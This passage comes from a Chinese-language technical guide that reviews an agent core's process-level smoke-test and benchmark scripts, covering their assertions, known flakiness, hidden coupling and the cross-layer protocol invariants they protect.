chat/finish {fullText: ...}
```

Mock 的判据在 43–46 行，注释写得比代码长：

```python
 43          # The self-check status bar is appended as a trailing user message, so the
 44          # last role is not a reliable signal — look for any tool result instead.
 45          has_tool_result = any(m.get("role") == "tool" for m in messages)
 46          chunks = FINAL_ROUND_SSE if has_tool_result else TOOL_ROUND_SSE
```

这条注释是**第 11 节 `test_status` 的直接后果**：`<agent_status>` 自检块附在最后一条 user 消息后面，
所以 `messages[-1]["role"]` 在第二轮起恒为 `user`。任何用「最后一条消息的 role」判断轮次的 mock 都会错。
六份脚本里都有这句相同注释（`smoke_tools` / `smoke_memory` / `smoke_mcp` / `smoke_subagent`，
`smoke_command` 与 `smoke_ask` 是简写版），属于**踩过之后的沉淀**。

另一条容易忽略的注释在 69–72 行：

```python
 69      # A fresh data dir per run: a reused session would already hold tool results from
 70      # the previous run and the mock would skip straight to the final answer.
 71      # 每次跑用干净的 data 目录：复用旧会话会让模拟服务看到历史工具结果而直接收尾。
 72      data_dir = tempfile.mkdtemp(prefix="agent-smoke-tools-")
```

如果用固定 data 目录复用会话 `smoke-tools`，`session.messages` 里已经有上一轮的 `role=tool`，
Mock 第一眼就看到它，直接返回最终文本，`tool/invoke` 永远不会出现 → 脚本变成「必失败」。
所以**每一个需要「从零开始」的脚本都用 `mkdtemp`**，只有 `smoke_rpc.py` 用固定的 `core/.smoke-data`
（因为它不验证历史状态，而且失败路径不依赖会话内容）。

> 副作用：`smoke_rpc.py` 会在仓库里留下 `core/.smoke-data/`。它应该被 `.gitignore` 覆盖；
> 如果没有，这就是一个会被误提交的工作区污染源。

### 12.5 `smoke_ask.py`：唯一需要「双向等待」的脚本

其他脚本都是壳**回答** Core；`ask_user` 是 Core **提问**、壳**回答**，而且 Core 在等答案期间**不能结束回合**。
这四条断言分别对应四个可能出错的地方：

| 行 | 断言 | 对应的实现细节 |
|---|---|---|
| 153–154 | `core/hello` 的 capabilities 含 `ask-user` | `server.py:170-174` 的能力列表 |
| 178–181 | `ask/user` 带 `askId` 与 `taskId` | 壳回答时必须回哪些 id |
| 183–184 | `questions` 是 2 条，且 `header` 为 `缓存策略` | 参数是否原样透传 |
| 202–205 | 工具结果含 `进程内 LRU` **与** `按天过期` | 选项答案与自定义答案都不能丢 |

那两个 capability 是**不同方向**的，容易混：

```
Core → 壳：core/hello.params.capabilities = ["chat", ..., "ask-user"]   “我能提问”
壳 → Core：ide/hello.params.capabilities  = ["ask-user"]                “我能渲染提问”
```

`server.py:721` 的判定只看后者：

```python
721          if "ask-user" not in self._shell_capabilities:
```

而 `smoke_ask.py` 两个方向都验了：153 行验前者，208 行验后者（发第二个 `ide/hello`，把能力清空）。

降级路径的断言在 207–222 行：

```python
207          # Degradation path: no capability means the tool fails fast, never hangs.
208          send({"method": "ide/hello", "params": {"ide": "smoke", "capabilities": []}})
...
215              failures.append("second chat did not finish without the capability")
...
221              if "没有可以接收提问的界面" not in TOOL_CONTENT["text"]:
222                  failures.append("degraded tool result unexpected: %r" % TOOL_CONTENT["text"])
```

注意 215 行断的是 `finish is None` →「没结束」才算失败。也就是说**超时本身就是在验证「不挂住」**。
这正是第 11 节 `test_ask.no_ui_degrades_to_assumptions` 锁住的同一件事，只不过一个在函数层、一个在进程层。

第二个 `ide/hello` 有两个「顺便」的效果，读完 `server.py:413-419` 才能意识到：

```python
413          elif method == "ide/hello":
417              capabilities = params.get("capabilities")
418              if isinstance(capabilities, list):
419                  self._shell_capabilities = {str(item) for item in capabilities}
```

1. 它是**整体替换**而不是并集，所以 `[]` 能真的把能力清空；
2. 它**不重置** `protocolVersion`、也不重建会话，所以第二次 `chat/start` 用的还是同一个 Core、同一个 `settings`。

### 12.6 `smoke_command.py`：三分类策略的进程级验证

三场对话，对应 `decide()` 的三个返回值：

| 会话 | 命令 | 期望 `permission` | 期望有 `tool/invoke` |
|---|---|---|---|
| `cmd-auto` | `git status` | `auto` | 是（壳直跑，不问） |
| `cmd-confirm` | `python deploy.py` | `confirm` | 是（壳弹窗问） |
| `cmd-deny` | `git push origin master` | —— | **否**（Core 直接拒绝） |

注意 `auto` 与 `confirm` 的差别**不在 Core 是否执行**，而在 `tool/invoke` 里那个 `permission` 字段：
Core 不执行任何命令，它只是告诉壳「这条命令你可以直接跑」还是「你得先问用户」。真正执行在壳里（`ToolDispatcher`）。
所以脚本第 145 行断的是字段值，不是行为：

```python
145              if params.get("permission") != STATE["expected"]:
146                  failures.append("%s: permission %r != %r"
147                                  % (command, params.get("permission"), STATE["expected"]))
```

而 `deny` 的断言必须回头去请求体里找，因为壳那一侧**什么都没收到**：

```python
182          # The refusal must reach the model as the tool result.
183          denied = any(
184              any(m.get("role") == "tool" and "已拒绝执行危险命令" in (m.get("content") or "")
185                  for m in messages)
186              for messages in BODIES
187          )
```

这一段是**双重生成器嵌套**，读法是从内向外：

```
最内层：某条消息 是 role=tool 且 content 含拒绝文案       → 一个布尔
中间层：某次请求体里 存在这样一条消息                    → 一个布尔
最外层：所有请求体里 存在这样一次                        → 最终布尔
```

#### 12.6.1 `deny` 场景的一个覆盖空洞

`run_chat(..., expect_invoke=False)` 时，脚本**不等** `tool/invoke`，只等 `chat/finish`。
如果 Core 错误地对危险命令也发了 `tool/invoke`，那一帧会被 `wait_for(finish)` 当作不匹配的帧丢掉，
脚本不会报错——**除非**壳没回 `tool/result` 导致回合卡住而超时。

实际情况下它确实会被超时兼住（Mock 只有在看到 `role=tool` 后才返回最终文本），所以仍能发现问题，
但失败信息会变成含糊的 `deny: chat did not finish`，而不是「不该发 tool/invoke 却发了」。
想修的话，这就是把这份脚本改成**帧缓冲式（写法 B）**的理由——改成 B 之后只需加一行：

```python
if wait_for(lambda m: m.get("method") == "tool/invoke", timeout=1):
    failures.append("dangerous command was forwarded to the shell")
```

#### 12.6.2 `STATE` 的隐式合约

```python
 27  STATE = {"command": "git status"}
...
176          STATE["expected"] = "auto"
177          run_chat("cmd-auto", "git status", expect_invoke=True)
178          STATE["expected"] = "confirm"
179          run_chat("cmd-confirm", "python deploy.py", expect_invoke=True)
180          run_chat("cmd-deny", "git push origin master", expect_invoke=False)
```

`STATE["expected"]` 不是在初始化时定义的，而是在**调用前**被外部赋值，`run_chat` 里直接读（行 145）。
这是典型的「隐式合约」：任何人插入一次 `run_chat` 而忘了先设 `expected`，就会 `KeyError`。
参数化本该走函数签名（`run_chat(session, command, expect_invoke, expected)`），这里为了少写几行而依赖全局。

---

### 12.7 `smoke_todos.py`：一条断言同时盖住「广播」与「落盘」

`todo_write` 是少数**既影响 UI 又影响磁盘**的工具：它要把清单推给壳（渲染成待办区），
同时要进会话文件（下次打开还能看到）。两件事在代码里是两个调用点，很容易只改一半。

脚本用两段验证把它们都圈住：

```python
135          update = wait_for(lambda m: m.get("method") == "chat/todos", timeout=20)
...
142              if got != TODOS:
143                  failures.append("chat/todos payload %r != %r" % (got, TODOS))
144              if not params.get("taskId"):
145                  failures.append("chat/todos carried no taskId")
...
156          send({"id": "get-1", "method": "session/get", "params": {"sessionId": "todo-1"}})
...
161              stored = ((answer.get("result") or {}).get("todos")) or []
163              if stored != TODOS:
164                  failures.append("persisted todos %r != %r" % (stored, TODOS))
```

细节值得抠两点：

1. **`got != TODOS` 是全量相等，不是子集。** 连 `id`、`status` 都要求逐字一致。如果哪天实现决定了「空 id 自动编号」，
   这条会立刻变红——测试在锁数据结构，不只是锁功能。
2. **`session/get` 在 `chat/finish` 之后发。** 顺序很关键：如果先发 `session/get`，Core 可能还没把清单写进
   `session.todos`。先等回合结束，再查落盘，才是在验证「持久化」而不是「内存值」。

`taskId` 的断言（144 行）常被当成冗余。其实它是给**多任务并发**用的：壳拿到 `chat/todos` 时如果不知道它是哪个
任务推的，两个会话同时跑就会串台（A 的清单画到 B 的面板里）。`chat/*` 系列通知里 `taskId` 的作用就是这个。

### 12.8 `smoke_memory.py`：验证「不该发的东西没发」

`memory_save` / `memory_search` 是**Core 内置工具**（`registry.register` 在 Core 侧），不经过壳。
所以这个脚本的核心断言是一条否定：

```python
135          invoke = wait_for(lambda m: m.get("method") == "tool/invoke", timeout=3)
136          if invoke:
137              failures.append("memory tool was forwarded to the shell: %r"
138                              % (invoke.get("params", {}).get("toolName"),))
```

它必须用帧缓冲式（写法 B），否则这行逻辑不成立（见 12.2.3）。这也是仓库里三份缓冲式脚本的共同动机：
**它们都要断言「没发生」**。

#### 12.8.1 值得留意的两个断言

```python
148          memory_dir = os.path.join(data_dir, "memories")
149          db_path = os.path.join(data_dir, "memory.db")
150          if not os.path.exists(db_path):
151              failures.append("memory.db was not created")
...
154          if not os.path.isdir(memory_dir):
155              # project_root is unknown here, so files land under <data>/memories
156              failures.append("memory markdown directory missing")
```

这是一个**「双存储」验证**：记忆既有 SQLite 索引（`memory.db`，存关键词/标题/时间），又有给人看的 Markdown 文件
（`<project>/memory/*.md`；没有 `project_root` 时落到 `<data>/memories`）。
冒烟脚本不传 `contextSnapshot`，所以 `project_root` 为空——这正是它验证「无 project_root 时的回退路径」的方式。

#### 12.8.2 一处小噪音

```python
152          memories = os.listdir(data_dir) if os.path.isdir(data_dir) else []
153          print("data dir:", memories)
```

变量叫 `memories`，实际是 **data 目录的列表**（`memories/`、`memory.db`、`sessions/`、`logs/` …）。
不影响正确性，但读代码时会误导。这种命名债在脚本类代码里很常见，也不值得单独去改——
但它提醒一件事：**`print` 出来的东西是你调试时唯一的信息源**，名字要准。

### 12.9 `smoke_mcp.py`：两个服务器、两种审批、一条竞态

这是十份里**唯一真实的「外部进程」测试**：它不只起 Core，还让 Core 去 `spawn` 两个 MCP 服务器进程。

```python
134          servers = [
135              {"name": "auto", "transport": "stdio", "command": sys.executable,
136               "args": [FAKE_SERVER], "auto_approve": True},
137              {"name": "ask", "transport": "stdio", "command": sys.executable,
138               "args": [FAKE_SERVER], "auto_approve": False},
139          ]
```

两个服务器用的是**同一个** `tests/fake_mcp_server.py`，只是 `name` 和 `auto_approve` 不同。
所以工具名分别是 `mcp__auto__echo` 与 `mcp__ask__echo`——命名规则 `mcp__<server>__<tool>` 在这里被顺带钉住了。

| 断言 | 位置 | 锁住的语义 |
|---|---|---|
| `mcp__*` 工具名格式 | 30–37 行 | 命名空间拼法 |
| 只弹 **一次** 确认，且 `server == "ask"` | 156–165 / 192–195 | `auto_approve` 真的只对单个服务器生效 |
| `echo:hi` 与 `echo:there` 都出现在工具消息里 | 180–189 | 两条路径的输出都回了模型 |
| 全程无 `tool/invoke` | 175–178 | MCP 工具在 Core 内部执行，不经壳 |

#### 12.9.1 `time.sleep(2.0)` 是一处已知的不稳定点

```python
146          # MCP servers connect asynchronously after settings/update.
147          # MCP 服务在 settings/update 之后异步连接，这里给一点握手时间。
148          time.sleep(2.0)
```

`settings/update` 是**通知**（无 id），`_apply_settings` 里发现 `mcp_servers` 变了就 `_schedule_mcp_refresh()`，
后者 `loop.create_task(self._refresh_mcp())`——完全异步，没有任何「连接完成」的通知帧。
所以脚本只能用固定 `sleep` 赌它 2 秒内连完。

- 在 SSD 的开发机上：实际握手约 200–300ms，2 秒很宽裕；
- 在杀毒软件实时扫描 `python.exe` 的 Windows 机器上：`spawn` 两个进程可能超过 2 秒；
- 一旦超时，`mcp__*` 工具没注册 → 模型收到的工具表里没有它们 → Mock 仍会发出那两个 `tool_calls` →
  Core 返回「未知工具」→ 后续断言会以莫名其妙的形状失败（`echo:hi not in joined`）。

**正确的做法**是让 Core 在 MCP 就绪后发一帧（比如 `mcp/ready`），或者把 `sleep(2.0)` 改成
「轮询 `session/list` 之外的某个返回工具表的 RPC」。现在没有这样的 RPC，所以暂无解——这是个真实的架构缺口。

#### 12.9.2 为什么 Mock 会「偷看」请求体两次

```python
 55          ROUNDS.append(body)
...
180          tool_messages = []
181          for body in ROUNDS:
182              for message in body.get("messages") or []:
183                  if message.get("role") == "tool":
184                      tool_messages.append(message.get("content") or "")
185          joined = "\n".join(tool_messages)
```

因为「两个工具都执行了」这个事实在**帧层面看不出来**：Core 只发一次 `agent/confirm`，工具结果不回壳。
唯一能看到两条 `echo:*` 输出同时存在的地方，就是第二轮发给模型的请求体。

### 12.10 `smoke_subagent.py`：一组最扎实的进程级断言

子代理是这套系统里最容易「默默出问题」的部分：任务跑完了、文本也回来了，但可能是**同一个子代理跑了两次**，
或者某个子代理拿到了 `subagent_dispatch` 而自我递归。这些都不会报错，只会烧 token。
所以这个脚本用四条断言把它们分别钉住：

```python
181          if len(starts) != 2:
182              failures.append("expected 2 subagent starts, got %d" % len(starts))
183          if len(ends) != 2:
184              failures.append("expected 2 subagent ends, got %d" % len(ends))
185          if any(not e.get("ok") for e in ends):
186              failures.append("a subagent reported failure")
187          roles = {e.get("role") for e in starts}
188          if roles != {"code-reviewer", "general"}:
189              failures.append("unexpected subagent roles: %r" % (roles,))
190          if any("durationMs" not in e for e in ends):
191              failures.append("subagent end event has no durationMs")
```

| 断言 | 如果缺失会怎样 |
|---|---|
| `starts == 2` | 调度器把两个任务合并成一个、或重复派发，都察觉不到 |
| `ends == 2` | 有任务永远不结束（泄漏的 `Task`），看起来也「跑完了」 |
| `roles == {code-reviewer, general}` | 两个任务都误用同一角色，结果仍然合理，无法发现 |
| `durationMs` 存在 | 壳的 UI 想显示「耗时 3.2s」时拿到 `undefined` |

#### 12.10.1 Mock 如何区分「主代理」与「子代理」

```python
 36  def _is_subagent_request(body) -> bool:
 37      # The main agent's prompt also mentions 子代理 (its role catalog), so match the
 38      # subagent header instead of the bare word.
 39      return _system_of(body).startswith("你现在是一个独立的子代理")
```

这里有一个**真实的耦合风险**：子代理的 system prompt 首句是硬编码的中文。
改动那句措辞（比如改成「你是一个子代理」），脚本不会报错——它会静默地把子代理请求当成主代理请求，
于是给子代理返回 `subagent_dispatch` 的 SSE，引发**递归派发**，最后表现为超时。

一个更稳的做法是在子代理 prompt 里放一个机器可读标记（如 `<!-- subagent:code-reviewer -->`）而不是匹配自然语言。
目前没这么做，所以：**动子代理 prompt 首句时，必须同步改这行。**

#### 12.10.2 `subagent_concurrency: 2` 其实没验证并发

```python
159              "subagent_concurrency": 2,
```

配合两个任务、期望 2 个 `start`，看起来在验证并发。其实**不是**：即使并发度是 1，两个任务也会先后执行，
仍然是 2 个 `start` + 2 个 `end`。要真验证并发，得断言两个 `start` 的**时间戳差值**小于 `durationMs` 的一半，
或者让 Mock 在响应子代理时人为阻塞并检查两个请求是否同时在飞。现在这里只是「把配置传下去」而已。

#### 12.10.3 递归与白名单的验证

```python
207          tool_names = set()
208          for body in subagent_requests:
209              for tool in body.get("tools") or []:
210                  tool_names.add(tool.get("function", {}).get("name"))
...
212          if "subagent_dispatch" in tool_names:
213              failures.append("recursive subagent_dispatch was offered to a subagent")
214          if not tool_names:
215              failures.append("subagent received no tools")
```

这两条是第 04 卷 `dispatch_strips_write_tools_from_override` 等单测的进程级补位：
单测验的是注册表构造结果，这里验的是**真正发给模型的 `tools` 数组**。中间隔着一层 provider 序列化，
而序列化是会出 bug 的（比如 `tools=[]` 被当成「无字段」而不发）。

---

### 12.11 `smoke_v3.py`：一条龙跑完 v3.0 的五个新 RPC

它是十份里**断言最密**的一份：一场对话 + 五个 RPC，逐个验证。

```
chat/start          → chat/finish
                    → memory/pendingChanged   （通知，不是响应）
memory/pending      → 2 条候选
memory/promote      → memoryId
memory/discard      → discarded: true
memory/pending      → 0 条
session/search      → 命中 v3-1
usage/report        → tasks >= 1
```

它比其它脚本多了一个小工具函数：

```python
107      def call(req_id, method, params=None):
108          send({"id": req_id, "method": method, "params": params or {}})
109          return wait_for(lambda m: m.get("id") == req_id, timeout=15)
```

把「发请求 + 等同 id 响应」包成一行，后面的 `pending` / `promote` / `discard` / `search` / `usage` 全是单行调用。
这是写法 A（队列消费式）能很简洁的地方：一个请求一个响应，顺序天然对齐。

#### 12.11.1 三个环境变量把数据全部关进临时目录

```python
 59      root = tempfile.mkdtemp(prefix="agent-smoke-v3-")
 60      data_dir = os.path.join(root, "data")
 61      log_dir = os.path.join(root, "logs")
 62      project_root = os.path.join(root, "project")
...
 68      env["AGENT_LOG_DIR"] = log_dir
 69      env["AGENT_USAGE_DIR"] = log_dir
```

| 变量 | 对应存储 | 不重定向的后果 |
|---|---|---|
| `--data-dir` | 会话 / 记忆 / 索引 | 写进仓库 |
| `AGENT_LOG_DIR` | 运行日志 | 污染用户目录 |
| `AGENT_USAGE_DIR` | 用量统计（按天转轮） | `usage/report` 会把开发者真实的历史用量算进去 → `tasks >= 1` 永远成立，等于没测 |

最后一行是真正的原因：`usage/report` 这条断言**必须**跑在干净目录上。否则开发者本地有 200 条历史记录，
即使本次任务根本没记账，`tasks >= 1` 也是绿的。

#### 12.11.2 `contextSnapshot` 让记忆落到「项目」下

```python
124          send({"id": "chat-1", "method": "chat/start", "params": {
125              "sessionId": "v3-1",
126              "message": USER_MESSAGE,
127              "contextSnapshot": {"project_root": project_root},
128          }})
```

上一节 `smoke_memory` 故意**不**传这个字段（验证回退路径）；这里故意**传**（验证子目录）。
对应的服务端代码是 `server.py:471-478` —— 解析成功后会调 `_bind_project_root()`，把
`MemoryService` / `SkillService` / `index` / `mcp` 全部重建到新根上。所以这一行实际上在验证一个**运行时热切换**。

#### 12.11.3 中文子串检索：`LIKE` 回退的进程级证明

```python
171          found = call("search-1", "session/search", {"query": "中文写提交信息", "limit": 5})
...
174          if not any(item.get("sessionId") == "v3-1" for item in results):
175              failures.append("session/search missed the saved conversation: %r" % (results,))
```

查询词 `中文写提交信息` 是用户消息 `以后都用中文写提交信息。不要用 wget 下载依赖。` 的一个**中间子串**。
它既不是完整句、也不在句首——这正是为了绕开「按词分词」而验证**子串匹配**能力。
第 11.6 节提到过：SQLite FTS 分词器不认得中文，中文查询会回退到 `LIKE`。这条断言就是那个回退的现场证据。

#### 12.11.4 这份脚本最脆的一处

```python
150          if len(items) != 2:
151              failures.append("expected 2 candidates, got %d" % len(items))
```

它要求从**一句话**（`以后都用中文写提交信息。不要用 wget 下载依赖。`）里恰好抽出 **2 条**待确认记忆。
这依赖待确认记忆的抽取启发式（句子切分 + 指令句识别）。任何人调一下阈值、加一条过滤规则，
这个 2 就可能变 1 或 3，脚本立刻红。

这和 12.10.1 的 prompt 首句耦合是同一类问题：**冒烟脚本把「实现细节」当成了契约**。
修法不是把断言放宽到 `>= 1`（那样就测不出重复捕获了），而是在测试数据里放三句**形状明显不同**的指令句，
比如「一句中文」「一句英文」「一句带数字」，让启发式的调整不会再无痛地改变数量。

### 12.12 `smoke_team.py`：一张预审卡与一条完整团队链

这是最长的一份冒烟脚本（334 行），也是唯一**同时扮演壳与用户**的：Mock LLM 按轮次写死四个 SSE 回合，脚本则负责回答确认卡、执行 `tool/invoke`、收集通知。

```
PM：team_preapprove → team_dispatch → team_post → 最终文本
壳：agent/confirm（预审卡）→ tool/invoke（写文件）→ 收 chat/artifact
```

断言按链路顺序排列（全部用 `failures.append`）：

| 断言 | 行 | 锁住什么 |
|---|---:|---|
| `core/hello does not advertise team` | 200 | 团队能力在握手上就声明 |
| `team/list returned no teams` | 220 | 名册能读出来 |
| `team/list did not mark the active team` | 224 | 当前团队标记正确 |
| `expected exactly 1 preapprove card` | 242 | 一阶段只预审一次 |
| `member never wrote a file` | 247 | 成员真的动了文件 |
| `approved phase did not auto-approve the write` | 251 | 预审豁兔的进程级证据 |
| `write card is not labelled with the member` | 254 | 用户知道是谁在改 |
| `team_dispatch leaked to the Shell` | 259 | 团队内部工具不外发 |
| `no impl artifact reached the Shell` | 264 | 交付物经 `chat/artifact` 到达壳 |
| `member event has no teamRunId` | 270 | 成员事件带团队运行 id |
| `member event is not labelled with the actor` | 272 | 成员事件带角色名 |
| `playbook missing from the PM prompt` | 284 | 剧本进了 PM 的提示词 |
| `roster missing from the PM prompt` | 286 | 名册也进了 |
| `write member did not receive write_file` | 297 | 能力档真的授与了写工具 |
| `deletion was granted to a member` | 299 | `delete_file` 不在任何档位 |
| `recursion was offered to a member` | 301 | 成员拿不到 `team_dispatch` |

📌 **这份脚本必须用写法 B（帧缓冲式）**：要断言「预审卡恰好一张」，就得到历史帧里数——队列式 `wait_for` 会把前面不匹配的帧吃掉，根本数不出来。

📌 **`no impl artifact reached the Shell` + 前置的 `team_dispatch leaked` 是一对相反的断言**：交付物**要**越过边界到达壳，团队内部工具**不能**。同一个进程里同时验证「该发的发了、不该发的没发」。

⚠️ **最脆的一处**：`PREAPPROVE_ROUND` 里的文件清单与成员角色名是**硬编码**的。改内置团队剧本、改预审入参字段，这份脚本就会红——它名义上测协议与编排，实际上把「剧本内容」也当成了契约（与 12.10.1 的 prompt 首句耦合同类）。

### 12.13 `bench_core.py`：一份不做门禁的基线

它不是测试，是**测量仪**。docstring 把四个指标和目标写得很清楚：

```python
 45  TARGETS = {
 46      "coldStartMs": 3000.0,
 47      "idleRssMb": 120.0,
 48      "roundTripMs": 300.0,
 49      "sessionListMs": 150.0,
 50  }
 51  HISTORY_SESSIONS = 1000
 52  IDLE_SECONDS = 10.0
```

| 指标 | 起点 → 终点 | 为什么这么量 |
|---|---|---|
| `coldStartMs` | `Popen` 前 `perf_counter()` → 收到 `core/hello` | 用户双击 IDE 到面板可用的感知延迟 |
| `indexMs` | 收到 hello → `session/indexProgress.finished == true` | 一次性迁移，首次启动才有 |
| `roundTripMs` | `chat/start` → `chat/finish`（先热身一轮） | 端点真实延迟 + 循环开销 |
| `sessionListMs` | `session/list` 请求 → 同 id 响应 | 历史里 1000 条时的列表卡顿 |
| `idleRssMb` | 空闲 10 秒后读 RSS | 常驻内存，IDEA 本身就很吃内存 |

#### 12.13.1 为什么 `indexMs` 必须在 `sessionListMs` **之前**测

```python
249          # The first-run migration reads the same files the list endpoint does, so
250          # it has to finish first for a meaningful list number.
```

两项都要扫 1000 个 JSON 文件。如果并行或倒序，`sessionListMs` 会去和索引线程抢磁盘，
测出来的是「磁盘争抢」而不是「列表端点」。所以顺序被固定为：先等索引，再测列表。

#### 12.13.2 热身一轮的理由

```python
267          # Warm up once so the round trip measures the loop, not the first import.
268          send({"id": "warm", "method": "chat/start",
269                "params": {"sessionId": "bench-warm", "message": "ping"}})
```

第一轮包含：`httpx` 建连、TLS/SSL 初始化（无）、JSON schema 首次编译、prompt 拼接路径首次走通。
这些都是**进程级一次性成本**，不属于「单轮延迟」。不热身的话，`roundTripMs` 会稳定虚高 200ms 以上
（在 Windows 上尤其明显，因为首次 `ssl` / `socket` 导入比较贵）。

#### 12.13.3 RSS 读数的三平台回退

```python
 86  def rss_mb(pid: int) -> float:
 87      """Resident memory of the Core process, without requiring psutil."""
 88      try:
 89          import psutil  # type: ignore
 91          return psutil.Process(pid).memory_info().rss / (1024 * 1024)
 92      except Exception:
 93          pass
 94      if os.name == "nt":
 95          return _windows_rss_mb(pid)
 96      try:
 97          with open("/proc/%d/status" % pid, "r", encoding="utf-8") as handle:
 98              for line in handle:
 99                  if line.startswith("VmRSS:"):
100                      return float(line.split()[1]) / 1024.0
```

三级回退，都不行就返回 `0.0`：

1. `psutil`（可选依赖，有就用）；
2. Windows：`ctypes.windll.kernel32.OpenProcess(0x0400 | 0x0010)` + `psapi.GetProcessMemoryInfo`
   读 `WorkingSetSize`（`0x0400` = `PROCESS_QUERY_INFORMATION`，`0x0010` = `PROCESS_VM_READ`）；
3. Linux：`/proc/<pid>/status` 里 `VmRSS`（单位 KB）。

**这里有一个真实的误报通道**：所有分支失败时返回 `0.0`，而表格输出逻辑是：

```python
324          status = "ok" if value <= target else "over"
```

于是 `0.0 <= 120` 成立 → 打印 `idle RSS 0.0 MB ok`。一个「量不到」会以「完全合格」的形态出现在报告里。
这是**默认值陷阱**的教科书例子：失败应该返回 `None` 并在表格里打印 `n/a`，而不是一个合法的零值。

#### 12.13.4 `seed_sessions` 绕过存储层，直接写文件

```python
137  def seed_sessions(directory: str, count: int) -> None:
138      """The list endpoint reads every file, so the baseline needs real files."""
...
143          payload = {
144              "version": 2,
145              "id": "bench-%04d" % index,
...
154          with open(os.path.join(root, "bench-%04d.json" % index), "w", encoding="utf-8") as handle:
```

它手写 JSON，不调 `SessionStore.save()`。好处是快 1000 倍；代价是**它把磁盘格式当成了稳定 API**。
一旦会话文件从 `version: 2` 升到 3、或把 `todos` 字段改名，`seed_sessions` 不会报错，
`session/list` 会返回空列表——然后 `sessionListMs` 测的是「扫 1000 个无法解析的文件」的时间。

这类脚本需要在末尾加一条**自然断言**：

```python
if listed != args.sessions:
    print("WARN: only %d of %d seeded sessions were listed" % (listed, args.sessions))
```

现在 285 行已经把 `listed` 算出来了，311 行也打印了，但**从不与 `args.sessions` 比对**。数字就在那里，没人看。

#### 12.13.5 `--no-log-file`

```python
186          [sys.executable, "-m", "agent_core", "--project-id", "bench",
187           "--data-dir", data_dir, "--no-log-file"],
```

对应 `__main__.py:69` 的参数与 `:93` 的 `log_file = "" if args.no_log_file else ...`。
测性能时把日志文件关掉是必须的：每一行 `LOGGER.info` 都是一次磁盘写，在本就要扫 1000 个文件的前提下，
日志 I/O 会直接污染 `sessionListMs`。

---

### 12.14 这十一份脚本自身的问题清单

读测试代码也要带着审视。下面是通读 2,453 行后能确认的 10 个问题，按影响排序：

| # | 问题 | 位置 | 影响 |
|---|---|---|---|
| 1 | `stderr=DEVNULL` 丢掉全部诊断 | 10 份全部 | 启动失败只剩 `FAIL: no core/hello` |
| 2 | 队列式 `wait_for` 无法断言否定 | 7 份 | 只能靠后面的请求体间接兜 |
| 3 | `drain(0.3)` 时间窗过短 | `smoke_command:128` | 慢机器上旧帧串到新回合 |
| 4 | `STATE["expected"]` 隐式全局 | `smoke_command:27/145` | 新增调用忘了设值就 `KeyError` |
| 5 | `sleep(2.0)` 赌 MCP 握手 | `smoke_mcp:148` | 慢机上随机变红，错误信息误导 |
| 6 | prompt 首句硬编码匹配 | `smoke_subagent:39` | 改子代理提示词→静默递归 |
| 7 | 记忆候选数硬编码为 2 | `smoke_v3:150` | 调启发式→直接红 |
| 8 | 预审卡数量写死为 1、角色名硬编码 | `smoke_team:241/284-286` | 改内置剧本就红，与协议无关 |
| 9 | `rss_mb` 失败返回 `0.0` | `bench_core:86-103` | 「量不到」显示为「ok」 |
| 10 | `listed` 算了但从不比对 | `bench_core:285/311` | 播种失效/格式变更看不出来 |

另外两个「知情即可」的债：

**（1）十三行骨架复制了十份。** `send` / `wait_for` / `reader` 线程 / `finally` 收尾在每份脚本里几乎逐字重复。
好处是**每份脚本可以单独朗读、单独拉出来当最小示例**；坏处是改协议（比如加 `protocolVersion` 必填）要改 10 处。
对于一个不引入额外依赖、要分发给贡献者直接 `python xxx.py` 的仓库，这个权衡是合理的。

**（2）跨线程全局变量无同步点。** `TOOL_CONTENT` / `BODIES` / `ROUNDS` / `REQUESTS` 都是模块级容器，
由 `ThreadingHTTPServer` 的 handler 线程写、`main` 线程读。CPython 里 `list.append` 与 `dict[k] = v` 是原子的，
所以不会崩；但**没有任何 happens-before 关系**。现在的代码靠「HTTP 响应写完 → Core 继续跑 → 发 `chat/finish`」这条
间接链条撑着，在 CPython 下实际安全；换成 PyPy 或未来加 free-threading 构建后就不成立了。
严格做法是用 `threading.Event` 或把断言挪到 `server.shutdown()` 之后。

### 12.15 冒烟 vs 单测：怎么分工

遇到一个新功能，到底该写单测还是冒烟？一个可操作的判据：

```
问题能不能只用 Python 函数调用表达？
├─ 能  → 写单测（core/tests）
└─ 不能 → 它的「不能」是因为
         ├─ 需要另一个进程 / 真实 HTTP  → 写冒烟（core/scripts）
         ├─ 需要真实 IDE 的 UI / 文件系统  → 写手工自测清单（§13.3）
         └─ 需要真实模型                    → 不写自动测试，写 prompt 评估记录
```

具体对应到本项目：

| 要验证的东西 | 为什么不能只用单测 | 现有覆盖 |
|---|---|---|
| `decide()` 三分类 | —— | 单测（`test_commands`） |
| `permission` 字段真的发到了壳 | 跨进程序列化 | 冒烟（`smoke_command`） |
| `tool/result` 真的进了下一轮上下文 | 跨进程 + HTTP 请求体 | 冒烟（`smoke_tools`） |
| `<agent_status>` 不污染 transcript | —— | 单测（`test_status`） |
| 关闭 stdin 能优雅停止 | 进程生命周期 | 冒烟（十份全部） |
| IDEA 里的 diff 卡片长什么样 | 需要 Swing | 手工 |
| 模型会不会自己编工具名 | 需要真模型 | 手工 + prompt 调优 |

#### 12.15.1 新增一份冒烟脚本的 7 步

1. `cp smoke_tools.py smoke_xxx.py`（它是最短的双轮模板）；
2. 改 `--project-id` 与 `mkdtemp` 前缀（**必须不同**，否则多个脚本并行时会话互相干扰）；
3. 写 Mock 的第一轮 SSE（工具调用）与第二轮（最终文本）；
4. 选观测方式：看帧用写法 A/B，看「模型看到什么」用写法 C；
5. 写断言并**全部** `failures.append(...)`，不要 `assert`（`assert` 会中断后续断言，看不到全貌）；
6. 结尾 `print("XXX SMOKE PASS")` + `return 0`；
7. 在 README 的「验证」小节里加一行命令。

一条容易忘的：**任何要断言「没发生」的冒烟脚本，必须用帧缓冲式（写法 B）**，否则写不出来。

---

## 13. 跨层不变量：测试与冒烟共同守住的东西

前 12 节按「层」讲完，这一节按「不变量」重新组织。
每一条都标了它被谁锁住——**没有守卫的不变量就是迟早会破的不变量**。

### 13.1 不可破坏的契约

#### A. 协议层

| # | 不变量 | 锁在哪 |
|---|---|---|
| A1 | 响应形状恒为 `{id, ok, result}` 或 `{id, ok:false, error}`，中途不变 | `protocol.py:147-152`；无专项测试 |
| A2 | 每个帧一行 JSON，行内不出现裸换行（`ensure_ascii=False` 后中文直出） | 十份冒烟共同隐含验证 |
| A3 | 长耗时请求（`inline/complete`、`index/build`）走 `create_task`，不堵 stdin 循环 | `server.py:233-238` |
| A4 | `core/hello` 必先于任何响应发出 | 十份冒烟的第一步全是等 `core/hello` |
